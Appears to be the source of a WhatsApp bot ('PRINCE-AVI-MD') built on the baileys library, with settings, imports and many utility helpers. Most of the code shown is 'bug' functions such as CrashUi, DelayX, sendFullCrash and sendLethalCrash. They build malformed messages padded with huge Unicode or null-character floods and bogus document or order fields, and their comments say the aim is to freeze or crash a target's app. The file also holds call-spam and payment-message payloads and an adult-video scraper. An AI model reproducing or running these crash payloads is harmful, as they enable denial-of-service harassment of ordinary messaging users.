
/*═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
												  AVI OFC , TEAM AVI HAKER'S                                                                                                                                                                                                                                               
/═════════════════════════════════════════════*/




global.owner = ['94772836332']
global.packname = '© 𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢'
global.author = 'Avishka shavinda'
global.botname = 'Avi'
global.listprefix = ['+', '!', '.']

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)


//require('./system/database/menu.js')
require('./settings');

//const baiscope = require('baiscopelk-api');
const { GoogleGenerativeAI } = require("@google/generative-ai");

const fs = require('fs');
const os = require('os');
const qs = require('qs');
const util = require('util');
const gis = require('g-i-s');
const jimp = require('jimp');
const path = require('path');
//const AviCommands = require('./avi.js');
//const MenuCommands = require('./system/database/script/All-menu.js');
//const AutoAudioCommands = require('./AMedia/AutoAudio.js');
//const ppCouples = JSON.parse(fs.readFileSync('./ppcouple.json'));
//const ppCommands = require('./pastpaper.js');
//const scp2 = require('./lib/xnxx');
const fg = require('api-dylux');
//const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./yt')
const https = require('https');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('ytdl-core');
const cron = require('node-cron');
const cheerio = require('cheerio');
const fetch = require('node-fetch');
const FileType = require('file-type');
const { Chess } = require('chess.js');
const google = require('googlethis');
const similarity = require('similarity');
const PDFDocument = require('pdfkit');
const webp = require('node-webpmux');
const ffmpeg = require('fluent-ffmpeg');
const speed = require('performance-now');
const didYouMean = require('didyoumean');
const { performance } = require('perf_hooks');
const moment = require('moment-timezone');
const translate = require('translate-google-api');
const { Akinator, AkinatorAnswer } = require('aki-api');
const PhoneNum = require('awesome-phonenumber');
const { exec, spawn, execSync } = require('child_process');
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('baileys');
const menfesTimeouts = new Map();
const TicTacToe = require('./lib/tictactoe');
const { antiSpam } = require('./src/antispam');
const { TelegraPh, ConMedia } = require('./lib/uploader');
const { toAudio, toPTT, toVideo } = require('./lib/converter');
const { GroupUpdate, LoadDataBase } = require('./src/message');
const { RentBot, StopRentBot, ListRentBot } = require('./src/RentBot');
const { imageToWebp, videoToWebp, gifToWebp, writeExif } = require('./lib/exif');
const { cmdAdd, cmdDel, cmdAddHit, addExpired, getPosition, getExpired, getStatus, checkStatus, getAllExpired, checkExpired } = require('./src/database');
const { rdGame, iGame, tGame, gameSlot, gameCasinoSolo, gameSamgongSolo, gameMerampok, gameBegal, daily, buy, setLimit, addLimit, addMoney, setMoney, transfer, Blackjack, SnakeLadder } = require('./lib/game');



const metaQuote = {
            key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_GETDP" },
            message: { contactMessage: { displayName: "Avi", vcard: `BEGIN:VCARD\nVERSION:3.0\nN:Avi;;;;\nFN:Avi\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
        };



const { pinterest, wallpaper, remini, wikimedia, hitamkan, yanzGpt, mediafireDl, ringtone, styletext, instagramDl, tiktokDl, facebookDl, instaStalk, telegramStalk, tiktokStalk, genshinStalk, instaStory, bk9Ai, spotifyDl, ytMp4, ytMp3, NvlGroup, quotedLyo, youSearch, gptLogic, savetube, simi, geminiAi } = require('./lib/screaper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, errorCache, normalize, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, convertTimestampToDate, getAllHTML, tarBackup } = require('./lib/function');

module.exports = Avishka = async (Avishka, m, msg, store, groupCache) => {
	try {

        const Avi = Avishka; 
		await LoadDataBase(Avishka, m);
		await GroupUpdate(Avishka, m, store);
		const botNumber = await Avishka.decodeJid(Avishka.user.id)
		const body = ((m.type === 'conversation') ? m.message.conversation :
			(m.type == 'imageMessage') ? m.message.imageMessage.caption :
				(m.type == 'videoMessage') ? m.message.videoMessage.caption :
					(m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text :
						(m.type == 'reactionMessage') ? m.message.reactionMessage.text :
							(m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId :
								(m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
									(m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId :
										(m.type == 'interactiveResponseMessage' && m.quoted && m.quoted.fromMe) ? (m.message.interactiveResponseMessage?.nativeFlowResponseMessage ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : '') :
											(m.type == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || '') :
												(m.type == 'editedMessage') ? (m.message.editedMessage?.message?.protocolMessage?.editedMessage?.extendedTextMessage?.text || m.message.editedMessage?.message?.protocolMessage?.editedMessage?.conversation || '') :
													(m.type == 'protocolMessage') ? (m.message.protocolMessage?.editedMessage?.extendedTextMessage?.text || m.message.protocolMessage?.editedMessage?.conversation || m.message.protocolMessage?.editedMessage?.imageMessage?.caption || m.message.protocolMessage?.editedMessage?.videoMessage?.caption || '') : '') || '';
		const budy = (typeof m.text == 'string' ? m.text : '')
		const isCreator = isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
		const cases = db.cases ? db.cases : (db.cases = [...fs.readFileSync('./Avishka.js', 'utf-8').matchAll(/case\s+['"]([^'"]+)['"]/g)].map(match => match[1]));
		const prefix = isCreator ? (/^[°•π÷×¶∆£¢€ꦾ®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€ꦾ®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi)[0] : /[\uD800-\uDBFF][\uDC00-\uDFFF]/gi.test(body) ? body.match(/[\uD800-\uDBFF][\uDC00-\uDFFF]/gi)[0] : listprefix.find(a => body?.startsWith(a)) || '') : db.set[botNumber].multiprefix ? (/^[°•π÷×¶∆£¢€ꦾ®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€ꦾ®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi)[0] : /[\uD800-\uDBFF][\uDC00-\uDFFF]/gi.test(body) ? body.match(/[\uD800-\uDBFF][\uDC00-\uDFFF]/gi)[0] : listprefix.find(a => body?.startsWith(a)) || '¿') : listprefix.find(a => body?.startsWith(a)) || '¿'

		const isCmd = body.startsWith(prefix)

		const args = body.trim().split(/ +/).slice(1)

		const quoted = m.quoted ? m.quoted : m

	//     	const command = body.trim().split(/ +/).shift().toLowerCase();
const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ''


		const text = q = args.join(' ')
		const mime = (quoted.msg || quoted).mimetype || ''
		const qmsg = (quoted.msg || quoted)
		const hari = moment.tz('Asia/colombo').locale('id').format('dddd');
		const Avidate = moment.tz('Asia/colombo').locale('id').format('DD/MM/YYYY');
		const Times = moment.tz('Asia/colombo').locale('id').format('HH:mm:ss');


		const Timeslot = Times < '05:00:00' ? 'Good Morning 🌄' :
			Times < '11:00:00' ? 'Good Morning 🌄' :
			Times < '15:00:00' ? 'Good Afternoon 🌅' :
			Times < '18:00:00' ? 'Good Evening 🌃' :
			Times < '19:00:00' ? 'Good Evening 🌃' :
			Times < '23:59:00' ? 'Good Night ☄️' : 'Good Night ☄️';






		const almost = 0.72
		const time = Date.now()
		const time_now = new Date()
		const time_end = 60000 - (time_now.getSeconds() * 1000 + time_now.getMilliseconds());
		const readmore = String.fromCharCode(8206).repeat(999)
		const setv = pickRandom(listv)



		// Read Database
		const sewa = db.sewa
		const premium = db.premium
		const set = db.set[botNumber]

		// Database Game
		let suit = db.game.suit
		let chess = db.game.chess
		let chat_ai = db.game.chat_ai
		let menfes = db.game.menfes
		let tekateki = db.game.tekateki
		let akinator = db.game.akinator
		let tictactoe = db.game.tictactoe
		let tebaklirik = db.game.tebaklirik
		let kuismath = db.game.kuismath
		let blackjack = db.game.blackjack
		let tebaklagu = db.game.tebaklagu
		let tebakkata = db.game.tebakkata
		let family100 = db.game.family100
		let susunkata = db.game.susunkata
		let tebakbom = db.game.tebakbom
		let ulartangga = db.game.ulartangga
		let tebakkimia = db.game.tebakkimia
		let caklontong = db.game.caklontong
		let tebakangka = db.game.tebakangka
		let tebaknegara = db.game.tebaknegara
		let tebakgambar = db.game.tebakgambar
		let tebakbendera = db.game.tebakbendera

		const isVip = db.users[m.sender] ? db.users[m.sender].vip : false
		const isBan = db.users[m.sender] ? db.users[m.sender].ban : false
		const isLimit = db.users[m.sender] ? (db.users[m.sender].limit > 0) : false
		const isPremium = isCreator || checkStatus(m.sender, premium) || false
		const isNsfw = m.isGroup ? db.groups[m.chat].nsfw : false

		// Fake
		const fkontak = {
			key: {
				remoteJid: '0@s.whatsapp.net',
				participant: '0@s.whatsapp.net',
				fromMe: false,
				id: 'Avishka'
			},
			message: {
				contactMessage: {
					displayName: (m.pushName || author),
					vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${m.pushName || author},;;;\nFN:${m.pushName || author}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Avishka shavinda\nEND:VCARD`,
					sendEphemeral: true
				}
			}
		}


//auto recording all
    if (global.autoRecord) { if (m.chat) { Avishka.sendPresenceUpdate('recording', m.chat) }
}

									
      	async function sendOfferCall(target) {
    try {
        await Avishka.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}					

async function loadxios(Avishka, target, quoted = null) {
    await Avishka.sendMessage(target, {
        text: "🧪‌⃰Ꮡ‌‌" + "ꦾ࣯࣯" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
        contextInfo: {
            externalAdReply: {
                title: `PRINCE-AVI-MD`,
                body: `Bug System Active`,
                previewType: "PHOTO",
                thumbnail: null,
                sourceUrl: ``
            }
        }
    }, { quoted: quoted });
}




// Crash UI Function
const CrashUi = async (Avishka, target) => {
    await Avishka.relayMessage(
        target,
        {
            groupMentionedMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            locationMessage: {
                                degreesLatitude: 111111,
                                degreesLongitude: 111111
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: "\u0000" + "\u0000".repeat(150000) + "\u0000".repeat(150000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "\u0000"
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "120363330289360382@newsletter"),
                            groupMentions: [
                                {
                                    groupJid: "120363330289360382@newsletter",
                                    groupSubject: "\u0000"
                                }
                            ],
                            quotedMessage: {
                                documentMessage: {
                                    contactVcard: true
                                }
                            }
                        }
                    }
                }
            }
        },
        {
            participant: {
                jid: target
            }
        }
    );
}


async function DelayX(Avishka, target) {
    const msg = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        contextInfo: {
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 70000) + "@s.whatsapp.net")
                            ],
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimeStamp: Math.floor(Date.now())
                                }
                            },
                            externalAdReply: {
                                renderLargerThumbnail: true,
                                thumbnailUrl: "https://wa.me/stickerpack/zero?",
                                sourceUrl: "https://t.me/pemulanich",
                                showAdAttribution: true,
                                body: "Crashed by Avi",
                                title: "System Overload"
                            }
                        },
                        body: {
                            text: "Our You?" + "\x10".repeat(70000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(20000),
                            buttons: [
                                { name: "single_select", buttonParamsJson: "Xforc" },
                                { name: "call_permission_request", buttonParamsJson: "Xlay" }
                            ]
                        }
                    }
                }
            }
        },
        { userJid: Avishka.user.id }
    );

    await Avishka.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
    });

    const Xf = JSON.stringify({
        request_type: "ui_zero?",
        payload: "\x1A".repeat(75000) + "\x10".repeat(75000),
        version: "x",
        crash_id: Math.floor(Math.random() * 999999),
        experimental: true
    });

    const Xb = JSON.stringify({
        request_type: "payment_method",
        payload: "𑆿".repeat(10000) + "︅".repeat(1000),
        version: "Lanz",
        crash_id: Math.floor(Math.random() * 999999),
        experimental: true
    });

    const ZeroMsg = generateWAMessageFromContent(
        target,
        {
            documentMessage: {
                url: undefined,
                mimetype: "application",
                fileName: "Avi-Crash-System",
                fileLength: 9999999,
                pageCount: 1,
                caption: "⚠️ System Terminated",
                name: "galaxy_message",
                paramsJson: Xb,
                payment_message: {
                    note: "",
                    paramsJson: Xf
                }
            }
        },
        { userJid: Avishka.user.id }
    );

    await Avishka.relayMessage(target, ZeroMsg.message, {
        messageId: ZeroMsg.key.id,
        participant: { jid: target }
    });
}





async function invisibleSpam(Avishka, target) {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
    
    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0003",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                userJid: Avishka.user.id,
                participant: { jid: target }
            }
        );
        
        await Avishka.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
        
        await sleep(1000); // පොඩි විවේකයක්
    }
}



async function sendAviFreeze(Avishka, chatId, quoted) {
    const heavyString = ' ★𝙰𝚅𝙸 ★ \n'.repeat(1500); 

    const crashLocation = {
        location: {
            degreesLatitude: 99999999.99, 
            degreesLongitude: -99999999.99,
            name: heavyString, 
            address: heavyString,
            url: 'https://whatsapp.com/check?' + 'B'.repeat(10000)
        },
        contextInfo: {
        
title: "Avishka shavinda: ",
            forwardingScore: 999,
            isForwarded: true,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast',
            quotedMessage: {
                conversation: "⚠️ System Overload ⚠️"
            }
        }
    };

    await Avishka.sendMessage(chatId, crashLocation, { quoted: quoted });
    console.log("Avi inbox freeze sent to: " + chatId);
}


async function sendAviUI(Avishka, target) {
    // CPU එක පාලනය කිරීමට අපහසු වන සංකීර්ණ අක්ෂර මාලාව නිර්මාණය
    const cpuBurner = ("\u202E\u200B\u034F\u2060\u200E".repeat(9999) + "҉ꦾ".repeat(7000));
    const finalPayload = Array(999).fill(cpuBurner).join(" ");

    try {
        await Avishka.sendMessage(target, {
            text: "PRINCE-AVI-MD 4V ⚠️ \n" + "ꦾ".repeat(9999),
            contextInfo: {
                mentionedJid: [target],
                externalAdReply: {
                    title: "Avishka shavinda: " + finalPayload.substring(0, 9999),
                    body: "© 𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢...",
                    mediaType: 1,
                    renderLargerThumbnail: false,
                    sourceUrl: "https://Avi" + finalPayload.substring(0, 999) + ".com"
                },
                quotedMessage: {
                    adminInviteMessage: {
                        inviteCode: finalPayload,
                        groupJid: "120300000000000000@g.us",
                        caption: finalPayload
                    }
                }
            }
        });
        return { success: true };
    } catch (err) {
        console.error("Avi-UI Error:", err);
        return { success: false, error: err.message };
    }
}

/**
 * WhatsApp Full Crash Function
 * @param {Object} Avishka - Connection Object
 * @param {String} target - Target JID (m.chat)
 */
async function sendFullCrash(Avishka, target) {
    // ඉතා විශාල Invisible Unicode මාලාවක් (App එකට කියවීමට අපහසු දත්ත)
    const invisibleBuffer = "\u200b".repeat(200000); 
    const complexUnicode = "҉ꦾ".repeat(15000);
    const crashData = invisibleBuffer + complexUnicode;

    try {
        await Avishka.sendMessage(target, {
            text: `⚠️ *SYSTEM OVERLOAD* ⚠️\n` + crashData,
            contextInfo: {
                // සේවාදායකයාගේ (Target) පද්ධතිය පටලවාලීමට බොරු Metadata ඇතුළත් කිරීම
                externalAdReply: {
                    title: "PRINCE-AVI-MD ERROR",
                    body: crashData.substring(0, 5000),
                    mediaType: 1,
                    sourceUrl: "https://crash-report.system"
                },
                // Message එක දුටු සැණින් App එක Crash වීමට මෙය උපකාරී වේ
                quotedMessage: {
                    orderMessage: {
                        orderId: "77777777777",
                        thumbnail: Buffer.alloc(0), // හිස් Buffer එකක් මගින් Error එකක් ඇති කිරීම
                        itemCount: 999999,
                        status: 1,
                        surface: 1,
                        message: crashData,
                        orderTitle: "CRASH-UI"
                    }
                }
            }
        });
        return { success: true };
    } catch (err) {
        console.error("Crash Error:", err);
        return { success: false, error: err.message };
    }
}



async function booting(chatId, Avishka) {
let loadEmojis = [
    "⚡ 𝙰𝚅𝙸 𝚂𝚈𝚂𝚃𝙴𝙼 𝙱𝙾𝙾𝚃𝙸𝙽𝙶...",
    "🧊 [▢ ▢ ▢ ▢ ▢] 𝟶%",
    "🧊 [■ ▢ ▢ ▢ ▢] 𝟸𝟶%",
    "🧊 [■ ■ ▢ ▢ ▢] 𝟺𝟶%",
    "🧊 [■ ■ ■ ▢ ▢] 𝟼𝟶%",
    "🧊 [■ ■ ■ ■ ▢] 𝟾𝟶%",
    "🧊 [■ ■ ■ ■ ■] 𝟷𝟶𝟶%",
    "✅ 𝚂𝚈𝚂𝚃𝙴𝙼 𝙾𝙽𝙻𝙸𝙽𝙴!"
];

let { key } = await Avishka.sendMessage(chatId, { text: "⏳ Loading" });
    for (let i = 0; i < loadEmojis.length; i++) {
        await sleep(500);
        await Avishka.sendMessage(chatId, { text: loadEmojis[i], edit: key });
    }
}



async function loadings(chatId, Avishka) {
    // පෙන්විය යුතු ඉමෝජි පේළිය
    let loadEmojis = [
        "⏳ Loading.",
        "⌛ Loading..",
        "⏳ Loading...",
        "⌛ Loading....",
        "⏳ Loading.....",
        "✅ Success!"
    ];

    // මුල්ම මැසේජ් එක යැවීම
    let { key } = await Avishka.sendMessage(chatId, { text: "⏳ Loading" });

    // ඉමෝජි එකින් එක Edit කරමින් පෙන්වීම
    for (let i = 0; i < loadEmojis.length; i++) {
        await sleep(500); // වේගය පාලනය කිරීම (මිලි තත්පර 500)
        await Avishka.sendMessage(chatId, { text: loadEmojis[i], edit: key });
    }
}




/**
 * Avi New Generation Full Crash (2026)
 * @param {Object} Avishka - Connection Object
 * @param {String} target - Target JID (m.chat)
 */
async function sendAviNewCrash(Avishka, target) {
    // අතිශය බරපතල පෑලෝඩ් එකක් සෑදීම
    const heavyChar = "҉ꦾ".repeat(10000);
    const complexUnicode = "\u202E\u200B\u034F\u2060\u200E".repeat(5000);

    const message = {
        interactiveMessage: {
            header: {
                hasMediaAttachment: true,
                // මෙහිදී බොරු Document එකක් පෙන්වා RAM එක හිර කිරීම
                documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_n.enc",
                    mimetype: "application/pdf",
                    fileLength: "999999999999",
                    pageCount: 2026,
                    fileName: heavyChar
                }
            },
            body: {
                text: "⚠️ PRINCE-AVI-MD SYSTEM CRASH ⚠️\n" + complexUnicode
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "CRASH MENU",
                            sections: [{
                                title: heavyChar,
                                rows: Array(50).fill({
                                    title: "CRASH: " + complexUnicode,
                                    rowId: "id1"
                                })
                            }]
                        })
                    }
                ]
            }
        }
    };

    try {
        // RelayMessage හරහා වේගයෙන් පණිවිඩය යැවීම
        await Avishka.relayMessage(target, { viewOnceMessage: { message } }, { participant: { jid: target } });
        console.log("New Crash Sent Successfully!");
        return { success: true };
    } catch (err) {
        console.error("Crash Error:", err);
        return { success: false };
    }
}




// --- Cinesubz Search Function ---
async function searchCinesubz(query) {
    try {
        const searchUrl = `https://cinesubz.lk/?s=${encodeURIComponent(query)}`;
        const { data } = await axios.get(searchUrl);
        const $ = cheerio.load(data);
        const results = [];

        $('article').each((i, el) => {
            const title = $(el).find('.entry-title a').text();
            const link = $(el).find('.entry-title a').attr('href');
            const image = $(el).find('img').attr('src');
            if (title && link) {
                results.push({ title, link, image });
            }
        });
        return results[0]; // වඩාත්ම ගැළපෙන පළමු ප්‍රතිඵලය ලබා දෙයි
    } catch (e) {
        return null;
    }
}





// --- පහළ තියෙන Function එක ඔයාගේ Avishka.js එකේ අන්තිමට (Switch එකෙන් පිටත) දාන්න ---

async function sendLethalCrash(jid) {
    // Invisible Junk Payload (යවන්නාගේ Chat එකේ දිස් නොවේ)
    const invisiblePayload = "☣️".repeat(20000);

    const crashPayload = {
        documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/dead-payload.enc",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            title: "SYSTEM_OVERLOAD.docx",
            fileLength: "9999999999999", // Logic Error 1
            pageCount: 0xFFFFFFFF, // Logic Error 2 (Hex Max)
            fileName: "☣️ ALPHA-VISION-KILLER ☣️",
            jpegThumbnail: Buffer.alloc(5, 0), // Minimal buffer to prevent sender-side crash

            contextInfo: {
                expiration: 604800,
                participant: "0@s.whatsapp.net",
                quotedMessage: {
                    // Order Message එක ඇතුළේ ඇති Junk දත්ත නිසා ඇප් එක Frozen වේ
                    orderMessage: {
                        orderId: "AVI-" + Math.random().toString(36).toUpperCase(),
                        thumbnail: Buffer.alloc(1, 0),
                        itemCount: -1, // Logic Error 3
                        status: 1,
                        surface: 1,
                        message: invisiblePayload,
                        orderTitle: invisiblePayload,
                        sellerJid: "0@s.whatsapp.net"
                    }
                }
            }
        }
    };

    // relayMessage පාවිච්චි කරන නිසා යවන්නාගේ UI එක මේ දත්ත කියවන්න යන්නේ නැත
    await Avishka.relayMessage(jid, crashPayload, { 
        messageId: "AVI-" + Math.random().toString(36).toUpperCase() 
    });
}


async function xnxxdl(URL) {
  return new Promise((resolve, reject) => {
    fetch(`${URL}`, {method: 'get'}).then((res) => res.text()).then((res) => {
      const $ = cheerio.load(res, {xmlMode: false});
      const title = $('meta[property="og:title"]').attr('content');
      const duration = $('meta[property="og:duration"]').attr('content');
      const image = $('meta[property="og:image"]').attr('content');
      const videoType = $('meta[property="og:video:type"]').attr('content');
      const videoWidth = $('meta[property="og:video:width"]').attr('content');
      const videoHeight = $('meta[property="og:video:height"]').attr('content');
      const info = $('span.metadata').text();
      const videoScript = $('#video-player-bg > script:nth-child(6)').html();
      const files = {
        low: (videoScript.match('html5player.setVideoUrlLow\\(\'(.*?)\'\\);') || [])[1],
        high: videoScript.match('html5player.setVideoUrlHigh\\(\'(.*?)\'\\);' || [])[1],
        HLS: videoScript.match('html5player.setVideoHLS\\(\'(.*?)\'\\);' || [])[1],
        thumb: videoScript.match('html5player.setThumbUrl\\(\'(.*?)\'\\);' || [])[1],
        thumb69: videoScript.match('html5player.setThumbUrl169\\(\'(.*?)\'\\);' || [])[1],
        thumbSlide: videoScript.match('html5player.setThumbSlide\\(\'(.*?)\'\\);' || [])[1],
        thumbSlideBig: videoScript.match('html5player.setThumbSlideBig\\(\'(.*?)\'\\);' || [])[1]};
      resolve({status: 200, result: {title, URL, duration, image, videoType, videoWidth, videoHeight, info, files}});
    }).catch((err) => reject({code: 503, status: false, result: err}));
  });
}


		/*|⬡════════════════════════════════════════════|❝   𝙰vi - Bug function  ™ ❞|═══════════════════════════════════════════⬡|*/
		/*|⬡════════════════════════════════════════════|❝   𝙰vi - OFC  ™ ❞|═══════════════════════════════════════════⬡|*/
		/*|⬡════════════════════════════════════════════|❝   𝙰vi - Intelligence  ™ ❞|═══════════════════════════════════════════⬡|*/


		//======bug functions========\\

		const force = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./AMedia/Avix.png`)
					},
					"nativeFlowMessage": {
						"buttons": [
							{
								"name": "review_and_pay",
								"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":490994400,\"offset\":100},\"tax\":{\"value\":4909944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🗡REAL-KING-AVI🗡 🗡REAL-KING-AVI🗡 🗡REAL-KING-AVI🗡\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
							}
						]
					}
				}
			}
		}

		const force2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./AMedia/Avix.png`)
					},
					"nativeFlowMessage": {
						"buttons": [
							{
								"name": "review_and_pay",
								"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🗡REAL-KING-AVI🗡 🗡REAL-KING-AVI🗡 🗡REAL-KING-AVI🗡\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
							}
						]
					}
				}
			}
		}

		const oneclickAvi = {
			key: {
				remoteJid: "6283873562829@s.whatsapp.net",
				fromMe: false,
				id: "BAE5993ADBA583B5",
			},
			message: {
				extendedTextMessage: {
					text: "n",
					contextInfo: {
						participant: "13135550002@s.whatsapp.net",
						quotedMessage: {
							extendedTextMessage: {
								text: "*~🗡REAL-KING-AVI🗡*",
							},
						},
						remoteJid: "status@broadcast",
					},
				},
			},
			messageTimestamp: 1738876193,
			broadcast: false,
			pushName: "2709",
		}


		const sendReaction = async reactionContent => {
			Avishka.sendMessage(m.chat, {
				'react': {
					'text': reactionContent,
					'key': m.key
				}
			});
		};

		async function blackening(target, kuwoted) {
			var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				"stickerMessage": {
					"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
					"fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
					"fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
					"mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
					"mimetype": "image/webp",
					"directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
					"fileLength": "10116",
					"mediaKeyTimestamp": "1715876003",
					"isAnimated": false,
					"stickerSentTs": "1715881084144",
					"isAvatar": false,
					"isAiSticker": false,
					"isLottie": false
				}
			}), { userJid: target, quoted: kuwoted });
			await Avishka.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
		}

		async function locationAviy(target, kuwoted) {
			var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						"liveLocationMessage": {
							"degreesLatitude": "p",
							"degreesLongitude": "p",
